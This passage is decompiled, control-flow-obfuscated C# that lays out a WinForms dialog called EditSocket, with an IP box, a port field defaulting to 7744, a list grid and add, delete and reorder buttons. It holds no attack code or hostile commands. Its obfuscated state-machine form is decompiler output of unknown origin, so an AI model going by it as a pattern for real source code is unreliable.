            ((EditSocket) this).po.Value = new Decimal(new int[4]
            {
              7744,
              0,
              0,
              0
            });
            num1 = (int) num2 * 1179086907 ^ 610603964;
            continue;
          case 38:
            ((EditSocket) this).Label1.Name = EXGuarder.\u003066C635B;
            ((EditSocket) this).Label1.Size = new Size(81, 13);
            num1 = (int) num2 * 1189556644 ^ -138131163;
            continue;
          case 39:
            gridViewCellStyle2.Font = new Font(EXGuarder.\u0034E3C3B33, 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            gridViewCellStyle2.ForeColor = Color.FromArgb(190, 190, 190);
            num1 = (int) num2 * 2119224521 ^ 492342059;
            continue;
          case 40:
            ((EditSocket) this).PanelBOX.Controls.Add((Control) ((EditSocket) this).btnDown);
            ((EditSocket) this).PanelBOX.Controls.Add((Control) ((EditSocket) this).T0);
            ((EditSocket) this).PanelBOX.Controls.Add((Control) ((EditSocket) this).Label2);
            num1 = (int) num2 * 153473427 ^ -1670453396;
            continue;
          case 41:
            ((EditSocket) this).DGV0.RowHeadersVisible = false;
            num1 = (int) num2 * -694781093 ^ 154941675;
            continue;
          case 42:
            ((EditSocket) this).b_del.Text = EXGuarder.\u0035C3B781C;
            num1 = (int) num2 * -475391037 ^ 1984289603;
            continue;
          case 43:
            ((EditSocket) this).PanelBOX.PerformLayout();
            ((ISupportInitialize) ((EditSocket) this).DGV0).EndInit();
            ((EditSocket) this).po.EndInit();
            num1 = (int) num2 * -1485852941 ^ 1757294568;
            continue;
          case 44:
            ((EditSocket) this).TextIP.Location = new Point(3, 44);
            num1 = (int) num2 * -1557133250 ^ 478711810;
            continue;
          case 45:
            ((EditSocket) this).btnUp = new Button();
            ((EditSocket) this).btnDown = new Button();
            num1 = (int) num2 * 494210995 ^ 1677937976;
            continue;
          case 46:
            ((EditSocket) this).b_Add.Size = new Size(67, 23);
            num1 = (int) num2 * -397276379 ^ 1280924748;
            continue;
          case 47:
            ((EditSocket) this).PanelBOX.TabIndex = 11;
            ((EditSocket) this).OKY.BackColor = Color.FromArgb(190, 190, 190);
            num1 = (int) num2 * 1928186492 ^ -1235260412;
            continue;
          case 48:
            this.Opacity = 0.0;
            num1 = (int) num2 * -1987294245 ^ -1460778596;
            continue;
          case 49:
            ((EditSocket) this).btnUp.FlatStyle = FlatStyle.Flat;
            num1 = (int) num2 * 1774844619 ^ -1276008474;
            continue;
          case 50:
            ((EditSocket) this).PanelBOX.Controls.Add((Control) ((EditSocket) this).b_del);
            ((EditSocket) this).PanelBOX.Controls.Add((Control) ((EditSocket) this).DGV0);
            num1 = (int) num2 * 626775167 ^ -2090976047;
            continue;
          case 51:
            ((EditSocket) this).Label1.TabIndex = 10;
            num1 = (int) num2 * -1409487247 ^ 1765213598;
            continue;
          case 52:
            ((EditSocket) this).Label2.TabIndex = 11;
            ((EditSocket) this).Label2.Text = EXGuarder.\u0032B546501;
            ((EditSocket) this).Label1.AutoSize = true;
            ((EditSocket) this).Label1.ForeColor = Color.FromArgb(190, 190, 190);
            num1 = (int) num2 * 1212036945 ^ -1531870987;
            continue;
          case 53:
            ((EditSocket) this).po.BackColor = Color.Black;
            num1 = (int) num2 * -392302233 ^ -1433282121;
            continue;
          case 54:
            ((EditSocket) this).b_Add = new Button();
            num1 = (int) num2 * -491254562 ^ -830853770;
            continue;
          case 55:
            ((EditSocket) this).Label1.Location = new Point(0, 25);
            num1 = (int) num2 * -188379102 ^ -1295718504;
            continue;
          case 56:
            ((EditSocket) this).btnDown.Location = new Point(185, 270);
            ((EditSocket) this).btnDown.Name = EXGuarder.\u0033A74456A;
            ((EditSocket) this).btnDown.Size = new Size(67, 23);
            ((EditSocket) this).btnDown.TabIndex = 13;
            ((EditSocket) this).btnDown.Text = EXGuarder.\u0031D6F0C07;
            ((EditSocket) this).btnDown.UseVisualStyleBackColor = false;
            num1 = (int) num2 * -1554171874 ^ -1485581844;
            continue;
          case 57:
            goto label_3;
          case 58:
            ((EditSocket) this).PanelBOX.Dock = DockStyle.Fill;
            num1 = (int) num2 * 1065900269 ^ 626233027;
            continue;
          case 59:
            ((EditSocket) this).DGV0.AllowUserToResizeColumns = false;
            num1 = (int) num2 * 682747094 ^ -150381103;
            continue;
          case 60:
            ((EditSocket) this).po.BorderStyle = BorderStyle.None;
            ((EditSocket) this).po.ForeColor = Color.FromArgb(190, 190, 190);
            ((EditSocket) this).po.Location = new Point(185, 91);
            num1 = (int) num2 * -1532720203 ^ -412956239;
            continue;
          case 61:
            ((EditSocket) this).OKY.Location = new Point(185, 299);
            ((EditSocket) this).OKY.Name = EXGuarder.\u0033862344F;
            ((EditSocket) this).OKY.Size = new Size(67, 23);
            num1 = (int) num2 * -214200431 ^ 1590724667;
            continue;
          case 62:
            ((EditSocket) this).btnUp.UseVisualStyleBackColor = false;
            ((EditSocket) this).btnDown.BackColor = Color.FromArgb(190, 190, 190);
            ((EditSocket) this).btnDown.FlatStyle = FlatStyle.Flat;
            num1 = (int) num2 * -455901487 ^ -638365238;
            continue;
          case 63:
            this.ResumeLayout(false);
            num1 = (int) num2 * 106304513 ^ -826737708;
            continue;
          case 64:
            ((EditSocket) this).DGV0.CellBorderStyle = DataGridViewCellBorderStyle.None;
            num1 = (int) num2 * 1653594314 ^ -688466582;
            continue;
          case 65:
            ((EditSocket) this).DGV0.AllowUserToResizeRows = false;
            num1 = (int) num2 * 1610317290 ^ -423167494;
            continue;
          case 66:
            ((EditSocket) this).TextIP.ForeColor = Color.FromArgb(190, 190, 190);
            num1 = (int) num2 * 536807561 ^ -1073386698;
            continue;
          case 67:
            ((EditSocket) this).po.Maximum = new Decimal(new int[4]
            {
              (int) ushort.MaxValue,
              0,
              0,
              0
            });
            num1 = (int) num2 * -1425920260 ^ -1299204169;
            continue;
          case 68:
            ((EditSocket) this).Column2.Name = EXGuarder.\u0035168695A;
            num1 = (int) num2 * 1630881852 ^ -1059957993;
            continue;
          case 69:
            ((EditSocket) this).OKY.ForeColor = Color.Black;
            num1 = (int) num2 * -1157522974 ^ 260824245;
            continue;
          case 70:
            ((EditSocket) this).OKY.TabIndex = 14;
            ((EditSocket) this).OKY.Text = EXGuarder.\u00321731E36;
            num1 = (int) num2 * -2142495090 ^ 1775894515;
            continue;
          case 71:
            ((EditSocket) this).DGV0.Name = EXGuarder.\u00344372C1D;
            ((EditSocket) this).DGV0.RowHeadersBorderStyle = DataGridViewHeaderBorderStyle.Single;
            num1 = (int) num2 * 499681032 ^ -749931373;
            continue;
          case 72:
            gridViewCellStyle1.Alignment = DataGridViewContentAlignment.MiddleLeft;
            gridViewCellStyle1.BackColor = Color.Black;
            gridViewCellStyle1.Font = new Font(EXGuarder.\u0034E3C3B33, 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            gridViewCellStyle1.ForeColor = Color.FromArgb(190, 190, 190);
            num1 = (int) num2 * 235105297 ^ -50600748;
            continue;
          case 73:
            ((EditSocket) this).DGV0.Location = new Point(2, 66);
            num1 = (int) num2 * -1231151984 ^ -2079977375;
            continue;
          case 74:
            ((EditSocket) this).DGV0.ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.None;
            num1 = (int) num2 * -1530240249 ^ -990888426;
            continue;
          case 75:
            ((EditSocket) this).b_del.ForeColor = Color.Black;
            num1 = (int) num2 * 1019391725 ^ -1666105744;
            continue;
          case 76:
            ((EditSocket) this).Label2.AutoSize = true;
            num1 = (int) num2 * -908401149 ^ 1408269842;
            continue;
          case 77:
            ((EditSocket) this).T0 = new Label();
            num1 = (int) num2 * -800551315 ^ -1114051990;
            continue;
          case 78:
            ((EditSocket) this).btnUp.BackColor = Color.FromArgb(190, 190, 190);
            num1 = (int) num2 * 681217263 ^ 344212353;
            continue;
          case 79:
            ((EditSocket) this).DGV0.Columns.AddRange((DataGridViewColumn) ((EditSocket) this).Column2);
            num1 = (int) num2 * -57025321 ^ 630200755;
            continue;
          case 80:
            ((EditSocket) this).T0.Location = new Point(-1, 0);
            num1 = (int) num2 * 1107113675 ^ -1232230557;
            continue;
          case 81:
            ((EditSocket) this).Label2 = new Label();
            ((EditSocket) this).Label1 = new Label();
            num1 = (int) num2 * -648589653 ^ 1162290845;
            continue;
          case 82:
            ((EditSocket) this).DGV0.AllowUserToAddRows = false;
            num1 = (int) num2 * -623162479 ^ -618868029;
            continue;
          case 83:
            ((EditSocket) this).po.TabIndex = 9;
            num1 = (int) num2 * 1327253290 ^ -2123644967;
            continue;
          case 84:
            this.ShowInTaskbar = false;
            this.Text = EXGuarder.\u00358155C1B;
            ((EditSocket) this).PanelBOX.ResumeLayout(false);
            num1 = (int) num2 * 1576115689 ^ -1254388143;
            continue;
          case 85:
            ((EditSocket) this).DGV0.BorderStyle = BorderStyle.None;
            num1 = (int) num2 * -1248776707 ^ -59271959;
            continue;
          case 86:
            ((EditSocket) this).DGV0.Size = new Size(174, 240);
            num1 = (int) num2 * -2029693911 ^ 2137501392;
            continue;
          case 87:
            ((EditSocket) this).po.Size = new Size(67, 16);
            num1 = (int) num2 * 652070690 ^ -1066457021;
            continue;
          case 88:
            ((EditSocket) this).T0.Size = new Size(97, 13);
            ((EditSocket) this).T0.TabIndex = 12;
            ((EditSocket) this).T0.Text = EXGuarder.\u003016F5069;
            num1 = (int) num2 * -232459965 ^ -28333300;
            continue;
          case 89:
            this.BackColor = Color.Black;
            num1 = (int) num2 * -1679628863 ^ -1650243792;
            continue;
          case 90:
            ((EditSocket) this).b_Add.TabIndex = 7;
            num1 = (int) num2 * 942312388 ^ -407874358;
            continue;
          case 91:
            ((EditSocket) this).TOpacity.Interval = 1;
            this.AutoScaleDimensions = new SizeF(6f, 13f);
            num1 = (int) num2 * 1296481012 ^ 946843435;
            continue;
          case 92:
            ((EditSocket) this).PanelBOX.Controls.Add((Control) ((EditSocket) this).Label1);
            ((EditSocket) this).PanelBOX.Controls.Add((Control) ((EditSocket) this).b_Add);
            num1 = (int) num2 * 945112038 ^ 1881452954;
            continue;
          case 93:
            ((EditSocket) this).b_del.Location = new Point(185, 159);
            ((EditSocket) this).b_del.Name = EXGuarder.\u0034050381B;
            ((EditSocket) this).b_del.Size = new Size(67, 23);
            ((EditSocket) this).b_del.TabIndex = 8;
            num1 = (int) num2 * -657229218 ^ -1815158180;
            continue;
          case 94:
            ((EditSocket) this).Label2.Name = EXGuarder.\u0032D163328;
            num1 = (int) num2 * 1214457509 ^ -446985133;
            continue;
          case 95:
            gridViewCellStyle1.SelectionForeColor = SystemColors.HighlightText;
            num1 = (int) num2 * -1915983790 ^ -1310693380;
            continue;
          case 96:
            ((EditSocket) this).T0.ForeColor = Color.FromArgb(190, 190, 190);
            num1 = (int) num2 * -1487916570 ^ 1204780152;
            continue;
          case 97:
            ((EditSocket) this).po.Name = EXGuarder.\u00338110E56;
            num1 = (int) num2 * -1672815559 ^ -272865528;
            continue;
          case 98:
            ((EditSocket) this).b_Add.Text = EXGuarder.\u003044A652A;
            ((EditSocket) this).b_Add.UseVisualStyleBackColor = false;
            ((EditSocket) this).b_del.BackColor = Color.FromArgb(190, 190, 190);
            num1 = (int) num2 * -1067013220 ^ -723202098;
            continue;
          case 99:
            ((EditSocket) this).Label1.Text = EXGuarder.\u00378672E52;
            ((EditSocket) this).b_Add.BackColor = Color.FromArgb(190, 190, 190);
            num1 = (int) num2 * -1984382476 ^ -821346544;
            continue;
          case 100:
            ((EditSocket) this).b_Add.FlatStyle = FlatStyle.Flat;
            num1 = (int) num2 * -981794146 ^ -91909091;
            continue;
          case 101:
            this.AutoScaleMode = AutoScaleMode.Font;
            num1 = (int) num2 * -2124029917 ^ -2100253500;
            continue;
          case 102:
            ((EditSocket) this).DGV0.TabIndex = 5;
            num1 = (int) num2 * -234750997 ^ 344131347;
            continue;
          case 103:
            ((EditSocket) this).PanelBOX.Location = new Point(0, 0);
            num1 = (int) num2 * 366961444 ^ -1024973025;
            continue;
          case 104:
            ((EditSocket) this).po.BeginInit();
            this.SuspendLayout();
            ((EditSocket) this).PanelBOX.Controls.Add((Control) ((EditSocket) this).OKY);
            ((EditSocket) this).PanelBOX.Controls.Add((Control) ((EditSocket) this).btnUp);
            num1 = (int) num2 * 775983604 ^ 1811758176;
            continue;
          case 105:
            ((EditSocket) this).TextIP.BackColor = Color.Black;
            num1 = (int) num2 * -1271504904 ^ -53346361;
            continue;
          case 106:
            gridViewCellStyle2.Alignment = DataGridViewContentAlignment.MiddleLeft;
            num1 = (int) num2 * -179566496 ^ 2057515881;
            continue;
          case 107:
            ((EditSocket) this).Label2.Size = new Size(27, 13);
            num1 = (int) num2 * 1316998828 ^ 258051048;
            continue;
          case 108:
            gridViewCellStyle2.SelectionBackColor = Color.FromArgb(190, 190, 190);
            num1 = (int) num2 * 1637125685 ^ 187930614;
            continue;
          case 109:
            ((EditSocket) this).PanelBOX.Controls.Add((Control) ((EditSocket) this).po);
            num1 = (int) num2 * 1532796409 ^ -1812965012;
            continue;
          case 110:
            ((EditSocket) this).btnUp.Text = EXGuarder.\u00338744B44;
            num1 = (int) num2 * -1946010505 ^ -137605140;
            continue;
          case 111:
            this.ClientSize = new Size(269, 362);
            num1 = (int) num2 * 1912048065 ^ -608173312;
            continue;
          default:
            goto label_114;
        }
      }
label_3:
      return;
label_114:;
    }
  }
}
